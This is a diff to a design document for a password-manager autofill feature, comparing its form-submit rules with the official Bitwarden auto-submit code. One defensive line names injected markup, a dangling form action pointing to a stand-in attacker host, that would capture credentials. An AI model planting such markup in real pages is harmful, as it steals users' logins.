@@ -100,12 +100,43 @@ Pateat's rule is in [Background execution](architecture.md#background-execution)
   unparsable values are refused. Injected markup on an admitted page, such as a dangling
   `<form action="https://attacker.example/">` or a `<base href>`, would otherwise
   receive the username and password.
+- A form that shows no button (ADR 0064) is submitted by Enter in its last field: Pateat
+  clicks the form's default button, its first submit button in tree order among the
+  form's controls, or calls `requestSubmit()` when it has none. The official auto-submit
+  (only under the automatic app login policy) instead clicks the first submit button in
+  the form's subtree whose words match its login button names, then a plain button so
+  named, then calls `requestSubmit()`, walks up from the last field when there is no
+  form, and never checks `disabled`
+  ([auto-submit-login.ts](https://github.com/bitwarden/clients/blob/abccf1e342dccba06a3cc635cd4c706defa64a32/apps/browser/src/autofill/content/auto-submit-login.ts#L111-L240)).
+  Pateat reads no button words (ADR 0033; the generation role judges the buttons it
+  saw), needs a `<form>`, and presses no default button that is disabled, associated
+  with the form only through `form=`, or already shown when the fill began, which the
+  generation role saw and did not name; the destination is checked as for a click.
 - A `javascript:` form action is allowed for fill and click (owner's decision,
   2026-10-18 04:19 UTC), as the official clients fill such a form like any other (their
   action handling above has no case for it). Chrome refuses to run the `javascript:` URL
   itself when the content script's click submits the form (the isolated world's
   `script-src 'self'`), so only forms whose own handlers sign in work;
   `action="javascript:doLogin()"` does not.
+
+## Submit button outside the form
+
+Official code is pinned at
+[`abccf1e`](https://github.com/bitwarden/clients/tree/abccf1e342dccba06a3cc635cd4c706defa64a32).
+Pateat's rule is `besideForm` in `packages/inference/src/plan.ts`
+([plan](plan.md#ai-evaluation-harness-progress)).
+
+- For filled fields inside a form, the official auto-submit looks for a login button
+  only inside that form and otherwise calls the form's `requestSubmit()`
+  ([auto-submit-login.ts](https://github.com/bitwarden/clients/blob/abccf1e342dccba06a3cc635cd4c706defa64a32/apps/browser/src/autofill/content/auto-submit-login.ts#L133-L142)).
+  Pateat's generated recipe may click a button outside the form (owner's choice,
+  2026-10-23 11:47 UTC). It does so only when every filled field is in that
+  one form, that form holds the page's only password field and has no button the page's
+  description lists (a script or icon button without a locator is not listed), no field
+  outside every form is on the page, and the button is the only one outside every form
+  and names no passkey, so it is the one the extractor keeps beside that form. Sakura
+  Internet's login button is a script `type="button"` just after its form: submitting
+  the form would post nothing the page handles.
 
 ## Frames
 
